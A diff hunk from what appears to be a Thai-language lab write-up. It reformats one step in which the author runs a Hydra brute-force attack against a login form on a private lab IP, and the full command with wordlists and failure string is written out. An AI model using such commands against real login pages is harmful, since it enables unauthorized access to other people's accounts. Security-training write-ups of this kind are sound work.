@@ -69,7 +69,7 @@
 
 4:หลังจากนั้นผมได้ใช้เครื่องมือในการทำ bruteforce attack นั่นก็คือ hydra
 
-Command : hydra -L username -P password 192.168.239.131 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid username or password"
+    ## 🔹 Command : hydra -L username -P password 192.168.239.131 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid username or password"
 <img width="1360" height="107" alt="image" src="https://github.com/user-attachments/assets/8620efc7-1d48-4145-bb33-2e17716f1ed9" />
 
 
